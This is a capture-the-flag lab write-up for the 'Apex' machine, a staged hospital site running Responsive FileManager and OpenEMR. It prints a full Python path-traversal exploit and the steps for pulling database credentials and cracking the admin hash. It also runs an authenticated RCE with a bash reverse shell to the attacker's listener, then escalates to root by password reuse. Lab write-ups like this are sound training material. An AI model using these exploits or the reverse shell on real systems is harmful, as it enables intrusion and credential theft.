# CTF Writeup: Apex

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.130.145
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-24 23:26 EST
Nmap scan report for 192.168.130.145
Host is up (0.043s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-title: APEX Hospital
|_http-server-header: Apache/2.4.29 (Ubuntu)
445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
3306/tcp open  mysql       MariaDB 5.5.5-10.1.48
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
|   Thread ID: 33
|   Capabilities flags: 63487
|   Some Capabilities: Support41Auth, LongColumnFlag, ODBCClient, FoundRows, ConnectWithDatabase, SupportsCompression, LongPassword, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolOld, InteractiveClient, SupportsTransactions, SupportsLoadDataLocal, IgnoreSigpipes, DontAllowDatabaseTableColumn, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: fi]w`[)UQw$J*/O~METT
|_  Auth Plugin Name: mysql_native_password
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: APEX

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-12-25T04:26:41
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: apex
|   NetBIOS computer name: APEX\x00
|   Domain name: \x00
|   FQDN: apex
|_  System time: 2025-12-24T23:26:39-05:00
|_clock-skew: mean: 1h40m00s, deviation: 2h53m14s, median: 0s

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   30.24 ms 192.168.45.1
2   30.16 ms 192.168.45.254
3   30.26 ms 192.168.251.1
4   30.95 ms 192.168.130.145

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.34 seconds
```

The website itself seems to be an healthcare webpage for an company named "Apex". Let's enumerate hidden endpoints on it.

```
dirsearch -u http://192.168.130.145      
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/saitama/Desktop/Exploiting/OSCP_Prep/ProvingGrounds/Linux/Apex/reports/http_192.168.130.145/_25-12-24_23-32-26.txt

Target: http://192.168.130.145/

[23:32:26] Starting: 
[23:32:29] 403 -  280B  - /.ht_wsr.txt                                      
[23:32:29] 403 -  280B  - /.htaccess.bak1                                   
[23:32:29] 403 -  280B  - /.htaccess.orig                                   
[23:32:29] 403 -  280B  - /.htaccess.save                                   
[23:32:29] 403 -  280B  - /.htaccess.sample
[23:32:29] 403 -  280B  - /.htaccess_extra                                  
[23:32:29] 403 -  280B  - /.htaccess_orig
[23:32:29] 403 -  280B  - /.htaccessBAK
[23:32:29] 403 -  280B  - /.htaccess_sc
[23:32:29] 403 -  280B  - /.htaccessOLD
[23:32:29] 403 -  280B  - /.htaccessOLD2
[23:32:29] 403 -  280B  - /.html                                            
[23:32:29] 403 -  280B  - /.htm
[23:32:29] 403 -  280B  - /.htpasswd_test                                   
[23:32:29] 403 -  280B  - /.htpasswds
[23:32:29] 403 -  280B  - /.httr-oauth                                      
[23:32:30] 403 -  280B  - /.php                                             
[23:32:36] 301 -  319B  - /assets  ->  http://192.168.130.145/assets/       
[23:32:36] 200 -  477B  - /assets/                                          
[23:32:42] 301 -  324B  - /filemanager  ->  http://192.168.130.145/filemanager/
[23:32:42] 200 -    6KB - /filemanager/                                     
[23:32:42] 200 -    8B  - /filemanager/upload.php                           
[23:32:52] 403 -  280B  - /server-status                                    
[23:32:52] 403 -  280B  - /server-status/                                   
[23:32:54] 200 -  466B  - /source/                                          
[23:32:54] 301 -  319B  - /source  ->  http://192.168.130.145/source/       
[23:32:55] 200 -  502B  - /thumbs/
```

The /filemanager endpoints seems rather interesting.
We also discovered an /openemr endpoint with an login interface.

Let's first start enumerating the /filemanager endpoint.

Up on analyzing the application, we found out after pressing the ? Symbol that it's utilizing RESPONSIVE filemanager v.9.13.4.

## Vulnerability Assessment

Up on investigating CVE's for this application, we can tell that there seems to be many exploits for our current version.

```
searchsploit RESPONSIVE filemanager         
------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                              |  Path
------------------------------------------------------------------------------------------------------------ ---------------------------------
Responsive Filemanager 9.13.1 - Server-Side Request Forgery                                                 | linux/webapps/45103.txt
Responsive FileManager 9.13.4 - 'path' Path Traversal                                                       | php/webapps/49359.py
Responsive FileManager 9.13.4 - Multiple Vulnerabilities                                                    | php/webapps/45987.txt
Responsive FileManager 9.9.5 - Remote Code Execution (RCE)                                                  | php/webapps/51251.py
Responsive FileManager < 9.13.4 - Directory Traversal                                                       | php/webapps/45271.txt
Responsive Filemanger <= 9.11.0 - Arbitrary File Disclosure                                                 | php/webapps/41272.txt
------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

I also enumerated the /openemr endpoint further & retrieved an admin.php endpoint, which provided us with version information about openemr 5.0.1

```
dirsearch -u http://192.168.130.145/openemr/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/saitama/Desktop/reports/http_192.168.130.145/_openemr__25-12-25_01-03-02.txt

Target: http://192.168.130.145/

[01:03:02] Starting: openemr/
[01:03:02] 200 -  567B  - /openemr/.bowerrc                                 
[01:03:03] 200 -  129B  - /openemr/.editorconfig                            
[01:03:03] 200 -   80B  - /openemr/.env.example                             
[01:03:04] 200 -  473B  - /openemr/.github/                                 
[01:03:04] 200 -   35B  - /openemr/.gitignore                               
[01:03:04] 200 -  113B  - /openemr/.github/ISSUE_TEMPLATE.md
[01:03:04] 403 -  280B  - /openemr/.ht_wsr.txt                              
[01:03:04] 403 -  280B  - /openemr/.htaccess.bak1                           
[01:03:04] 403 -  280B  - /openemr/.htaccess.orig                           
[01:03:04] 403 -  280B  - /openemr/.htaccess.sample                         
[01:03:04] 403 -  280B  - /openemr/.htaccess.save
[01:03:04] 403 -  280B  - /openemr/.htaccess_orig                           
[01:03:04] 403 -  280B  - /openemr/.htaccess_extra
[01:03:04] 403 -  280B  - /openemr/.htaccess_sc
[01:03:04] 403 -  280B  - /openemr/.htaccessBAK
[01:03:04] 403 -  280B  - /openemr/.htaccessOLD
[01:03:04] 403 -  280B  - /openemr/.htaccessOLD2                            
[01:03:04] 403 -  280B  - /openemr/.html
[01:03:04] 403 -  280B  - /openemr/.htm                                     
[01:03:04] 403 -  280B  - /openemr/.htpasswd_test                           
[01:03:04] 403 -  280B  - /openemr/.htpasswds                               
[01:03:04] 403 -  280B  - /openemr/.httr-oauth
[01:03:05] 403 -  280B  - /openemr/.php                                     
[01:03:06] 200 -  173B  - /openemr/.travis.yml                              
[01:03:08] 200 -  518B  - /openemr/admin.php                                
[01:03:12] 200 -    4KB - /openemr/bower.json                               
[01:03:12] 200 -    1KB - /openemr/build.xml                                
[01:03:13] 200 -  521B  - /openemr/ci/                                      
[01:03:13] 301 -  326B  - /openemr/cloud  ->  http://192.168.130.145/openemr/cloud/
[01:03:13] 200 -  466B  - /openemr/cloud/                                   
[01:03:13] 301 -  327B  - /openemr/common  ->  http://192.168.130.145/openemr/common/
[01:03:14] 200 -  511B  - /openemr/common/                                  
[01:03:14] 200 -    3KB - /openemr/composer.json                            
[01:03:14] 301 -  327B  - /openemr/config  ->  http://192.168.130.145/openemr/config/
[01:03:14] 200 -  488B  - /openemr/config/                                  
[01:03:14] 200 -  259KB - /openemr/composer.lock                            
[01:03:14] 200 -    3KB - /openemr/CONTRIBUTING.md                          
[01:03:14] 200 -   37B  - /openemr/controller.php                           
[01:03:14] 200 -  665B  - /openemr/controllers/                             
[01:03:15] 200 -  830B  - /openemr/custom/                                  
[01:03:15] 200 -  631B  - /openemr/docker-compose.yml                       
[01:03:18] 301 -  327B  - /openemr/images  ->  http://192.168.130.145/openemr/images/
[01:03:18] 200 -  977B  - /openemr/images/
CTRL+C detected: Pausing threads, please wait...                              
                                                                            
Task Completed
```


```
searchsploit openemr 5.0.1
------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                              |  Path
------------------------------------------------------------------------------------------------------------ ---------------------------------
OpenEMR 5.0.1 - 'controller' Remote Code Execution                                                          | php/webapps/48623.txt
OpenEMR 5.0.1 - Remote Code Execution (1)                                                                   | php/webapps/48515.py
OpenEMR 5.0.1 - Remote Code Execution (Authenticated) (2)                                                   | php/webapps/49486.rb
OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated)                                 | php/webapps/49998.py
OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated) (2)                             | php/webapps/50122.rb
OpenEMR 5.0.1.3 - (Authenticated) Arbitrary File Actions                                                    | linux/webapps/45202.txt
OpenEMR 5.0.1.3 - Authentication Bypass                                                                     | php/webapps/50017.py
OpenEMR 5.0.1.3 - Remote Code Execution (Authenticated)                                                     | php/webapps/45161.py
OpenEMR 5.0.1.7 - 'fileName' Path Traversal (Authenticated)                                                 | php/webapps/50037.py
OpenEMR 5.0.1.7 - 'fileName' Path Traversal (Authenticated) (2)                                             | php/webapps/50087.rb
------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

We found some interesting CVE's regarding path traversal vulnerabilities for responsive filemanager 9.13.4.

Let's utilize 49359.py in order to display users on the target system. The exploit had some syntax errors inside, so I modified it with the help of DeepSeek LLM.

PoC:

```
# Exploit Title: Responsive FileManager 9.13.4 - 'path' Path Traversal
# Date: 12/12/2018 (PoC)
# Date: 04/01/2020 (Auto Exploit)
# Exploit Author: SunCSR (Sun* Cyber Security Research)
# Google Dork: intitle:"Responsive FileManager 9.x.x"
# Vendor Homepage: http://responsivefilemanager.com/
# Software Link: https://github.com/trippo/ResponsiveFilemanager/releases/tag/v9.13.4
# Version: < 9.13.4
# Tested on: Linux 64bit + Python3

#!/usr/bin/python3

# Usage: python exploit.py [URL] [SESSION] [File Path]
# python3 exploit.py http://local.lc:8081 PHPSESSID=hfpg2g4rdpvmpgth33jn643hq4 /etc/passwd

import requests
import sys

def usage():
	if len(sys.argv) != 4:
		print("Usage: python3 exploit.py [URL]")
		sys.exit(0)

def copy_cut(url, session_cookie, file_name):
	headers = {'Cookie': session_cookie,
	'Content-Type': 'application/x-www-form-urlencoded'}
	url_copy = "%s/filemanager/ajax_calls.php?action=copy_cut" % (url)
	r = requests.post(
	url_copy, data="sub_action=copy&path=../../../../../../.."+file_name,headers=headers)
	return r.status_code

def paste_clipboard(url, session_cookie):
	headers = {'Cookie': session_cookie,'Content-Type': 'application/x-www-form-urlencoded'}
	url_paste = "%s/filemanager/execute.php?action=paste_clipboard" % (url)
	r = requests.post(
	url_paste, data="path=Documents", headers=headers)
	return r.status_code

def read_file(url, file_name):
	name_file = file_name.split('/')[-1]
	url_path = "%s/filemanager/Documents/%s" % (url,name_file) #This is the default directory,
	#if the website is a little different, edit this place
	result = requests.get(url_path)
	return result.text

def main():
	usage()
	url = sys.argv[1]
	session_cookie = sys.argv[2]
	file_name = sys.argv[3]
	print("[*] Copy Clipboard")
	copy_result = copy_cut(url, session_cookie, file_name)
	if copy_result==200:
		paste_result = paste_clipboard(url, session_cookie)
	else:
		print("[-] Paste False")
	if paste_result==200:
		print("[*] Paste Clipboard")
		print(read_file(url, file_name))
	else:
		print("[-] Copy False")

if __name__ == "__main__":
	main()
```

I then ran the exploit to display the /etc/passwd file and it looked like it didn't work. But when navigating to the Documents share in smb or in the /filemanager endpoint, we can actually see the passwd file.

```
python3 49359.py http://192.168.130.145/ PHPSESSID=n1rms2u8fkmf49bvjtsch9qdts /etc/passwd
[*] Copy Clipboard
[*] Paste Clipboard
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at 192.168.130.145 Port 80</address>
</body></html>
```

We can utilize this functionality in order to retrieve an mysql database password, which is usually stored in sqlconf.php 

The absolute path for openemr is /var/www/openemr/sites/default/sqlconf.php

## Initial Access

Ran the initial exploit.

```
python3 49359.py http://192.168.130.145/ PHPSESSID=n1rms2u8fkmf49bvjtsch9qdts /var/www/openemr/sites/default/sqlconf.php
[*] Copy Clipboard
[*] Paste Clipboard
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at 192.168.130.145 Port 80</address>
</body></html>
```

Discovering the sqlconf.php file within the Documents Folder on the webpage, isn't possible because any .php file will get processed by the server side. So let's check the smb share.

```
smbclient \\\\192.168.130.145/docs
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Dec 25 01:44:23 2025
  ..                                  D        0  Fri Apr  9 11:47:12 2021
  passwd                              N     1607  Thu Dec 25 01:44:33 2025
  sqlconf.php                         N      639  Thu Dec 25 01:47:53 2025
  OpenEMR Success Stories.pdf         A   290738  Fri Apr  9 11:47:12 2021
  OpenEMR Features.pdf                A   490355  Fri Apr  9 11:47:12 2021

                16446332 blocks of size 1024. 10834244 blocks available
smb: \>
```

Indeed, we got it! Let's download it locally and log into the database using the retrieved credentials.

Retrieved openemr:C78maEQUIEuQ

```
cat sqlconf.php 
<?php
//  OpenEMR
//  MySQL Config

$host   = 'localhost';
$port   = '3306';
$login  = 'openemr';
$pass   = 'C78maEQUIEuQ';
$dbase  = 'openemr';

//Added ability to disable
//utf8 encoding - bm 05-2009
global $disable_utf8_flag;
$disable_utf8_flag = false;

$sqlconf = array();
global $sqlconf;
$sqlconf["host"]= $host;
$sqlconf["port"] = $port;
$sqlconf["login"] = $login;
$sqlconf["pass"] = $pass;
$sqlconf["dbase"] = $dbase;
//////////////////////////
//////////////////////////
//////////////////////////
//////DO NOT TOUCH THIS///
$config = 1; /////////////
//////////////////////////
//////////////////////////
//////////////////////////
?>
```

Logged into mysql.

```
mysql -h 192.168.130.145 -u openemr -p -P 3306 -A --skip-ssl-verify-server-cert
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 34
Server version: 10.1.48-MariaDB-0ubuntu0.18.04.1 Ubuntu 18.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

Retrieved admin password hash.

```
MariaDB [openemr]> SELECT * FROM users_secure;
+----+----------+--------------------------------------------------------------+--------------------------------+---------------------+-------------------+---------------+-------------------+---------------+
| id | username | password                                                     | salt                           | last_update         | password_history1 | salt_history1 | password_history2 | salt_history2 |
+----+----------+--------------------------------------------------------------+--------------------------------+---------------------+-------------------+---------------+-------------------+---------------+
|  1 | admin    | $2a$05$bJcIfCBjN5Fuh0K9qfoe0eRJqMdM49sWvuSGqv84VMMAkLgkK8XnC | $2a$05$bJcIfCBjN5Fuh0K9qfoe0n$ | 2021-05-17 10:56:27 | NULL              | NULL          | NULL              | NULL          |
+----+----------+--------------------------------------------------------------+--------------------------------+---------------------+-------------------+---------------+-------------------+---------------+
1 row in set (0.033 sec)

MariaDB [openemr]>
```

Bruteforced an password for the user admin.

```
john admin.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 32 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thedoctor        (?)     
1g 0:00:00:07 DONE (2025-12-25 01:56) 0.1336g/s 5833p/s 5833c/s 5833C/s versus..sportygirl
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

For Authentication it's either admin:thedoctor or white:thedoctor.

Since we now got credentials let's move onto the authenticated RCE exploit for openemr for me specifically the 45161.py worked.

I started up my listener on port 80.

```
nc -lvnp 80
```

Executed the exploit with an bash rev shell as command.

```
python2 45161.py http://192.168.130.145/openemr -u admin -p thedoctor -c 'bash -i >& /dev/tcp/192.168.45.167/80 0>&1'
 .---.  ,---.  ,---.  .-. .-.,---.          ,---.    
/ .-. ) | .-.\ | .-'  |  \| || .-'  |\    /|| .-.\   
| | |(_)| |-' )| `-.  |   | || `-.  |(\  / || `-'/   
| | | | | |--' | .-'  | |\  || .-'  (_)\/  ||   (    
\ `-' / | |    |  `--.| | |)||  `--.| \  / || |\ \   
 )---'  /(     /( __.'/(  (_)/( __.'| |\/| ||_| \)\  
(_)    (__)   (__)   (__)   (__)    '-'  '-'    (__) 
                                                       
   ={   P R O J E C T    I N S E C U R I T Y   }=    
                                                       
         Twitter : @Insecurity                       
         Site    : insecurity.sh                     

[$] Authenticating with admin:thedoctor
[$] Injecting payload
```

Gained RCE as user "www-data".

```
nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.167] from (UNKNOWN) [192.168.130.145] 33664
bash: cannot set terminal process group (1351): Inappropriate ioctl for device
bash: no job control in this shell
www-data@APEX:/var/www/openemr/interface/main$
```

Retrieved local.txt in /home/white directory.


```
fc1e820dab29893c4701db5f9c049c94
```

## Privilege Escalation

Performed Credential Reuse and logged into user "root".

```
www-data@APEX:/home/white$ su
Password: 
root@APEX:/home/white#
```

Retrieved proof.txt in /root directory.

```
5f07c822dbb7122df8bc3f4451fff402
```
